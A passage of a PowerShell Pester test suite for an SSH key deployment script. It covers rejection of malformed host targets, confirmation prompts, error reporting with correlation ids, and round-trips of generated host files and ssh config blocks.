                ) | & $script:scriptUnderTest -WarningVariable +warnings -WarningAction SilentlyContinue *> $null
            }
            catch {
                Write-Verbose "Expected terminating error: $($_.Exception.Message)"
            }

            @($warnings | Where-Object { $_ -match 'Rejected target' }) | Should-BeCollection -Count 2
        }

        It 'preserves the order hosts arrived in' {
            $warnings = @()
            try {
                @('jeff@bad!first', 'jeff@bad!second') |
                    & $script:scriptUnderTest -WarningVariable +warnings -WarningAction SilentlyContinue *> $null
            }
            catch {
                Write-Verbose "Expected terminating error: $($_.Exception.Message)"
            }

            # -WarningVariable yields WarningRecord objects, not strings
            $rejected = @($warnings | ForEach-Object { "$_" } | Where-Object { $_ -match 'Rejected target' })
            $rejected[0] | Should-MatchString 'bad!first'
            $rejected[1] | Should-MatchString 'bad!second'
        }

        It 'fails instead of prompting when the pipeline yields nothing' {
            # An inventory query that matched nothing must not stop and ask. In CI that
            # either hangs the job or dies complaining about the console rather than the
            # host list. Read-Host cannot be mocked across a script invocation, so this
            # relies on the run failing fast; a prompt would block until the test times out.
            { @() | & $script:scriptUnderTest *> $null } |
                Should-Throw -ExceptionMessage '*No hosts were specified*'
        }
    }

    Context 'Interactive confirmation' {

        It 'keeps the existing file when the operator answers no' {
            $path = Join-Path $TestDrive 'entry-decline\hosts.txt'
            New-Item -ItemType Directory -Path (Split-Path $path -Parent) -Force | Out-Null
            Set-Content $path 'my-curated-list' -Encoding ascii

            # ShouldContinue needs a console prompt, so this runs in a child process with
            # 'n' on stdin. Out-of-process work is invisible to code coverage, but it is the
            # only way to exercise the declined branch honestly.
            $shell = (Get-Process -Id $PID).Path
            $output = 'n' | & $shell -NoProfile -File $script:scriptUnderTest `
                -CreateSampleHostFile -HostFile $path 2>&1 | Out-String

            $output | Should-MatchString 'Kept the existing file'
            (Get-Content $path) | Should-ContainCollection @('my-curated-list')
        }
    }

    Context 'Error Handling' {

        It 'reports the failure with its correlation id' {
            # Deliberately invalid so validation aborts before any key or network work
            $invalidTarget = 'bad host@lab'
            $message = $null
            try {
                & $script:scriptUnderTest -ComputerName $invalidTarget `
                    -KeyPath (Join-Path $TestDrive 'entry\key') `
                    -SshConfigPath (Join-Path $TestDrive 'entry\config') `
                    -CorrelationId 'entry-test-id' *> $null
            }
            catch {
                $message = $_.Exception.Message
            }

            $message | Should-MatchString 'Deployment failed'
            $message | Should-MatchString 'entry-test-id'
        }
    }
}


Describe 'Generated artefacts round-trip' -Tag 'Unit' {

    BeforeAll {
        Mock Write-Info {}
        Mock Write-Ok {}
        Mock Write-Note {}
    }

    Context 'Core Functionality' {

        It 'produces host entries that pass resolution and validation unchanged' {
            $path = Join-Path $TestDrive 'roundtrip\hosts.txt'
            $null = New-SampleHostFile -Path $path -DefaultUser 'jeff'

            # Uncomment the samples the way an operator would, then run them through the
            # same resolution and validation the deployment uses
            $entries = Get-Content $path |
                Where-Object { $_ -match '^#(server1|admin@server2|10\.0\.0\.15)$' } |
                ForEach-Object { $_.TrimStart('#') }

            Should-BeCollection -Actual @($entries) -Count 3

            $resolved = @(Resolve-TargetList -ProvidedHosts $entries -DefaultUser 'jeff')

            Should-BeCollection -Actual $resolved -Count 3
            $resolved | Should-All { Test-ValidTarget -Target $_ }
        }

        It 'produces an ssh config block that Find-SshConfigBlock can locate again' {
            $cfg = Join-Path $TestDrive 'rt-config\config'

            $null = Update-SshConfigEntry -ConfigPath $cfg -HostAddress '10.0.0.5' -User 'root' `
                -KeyPath 'C:\keys\id' -Port 22 -Alias 'pve'

            $lines = @(Get-Content $cfg)

            (Find-SshConfigBlock -Line $lines -Token @('pve')) | Should-NotBeNull
            (Find-SshConfigBlock -Line $lines -Token @('10.0.0.5')) | Should-NotBeNull
        }
    }
}
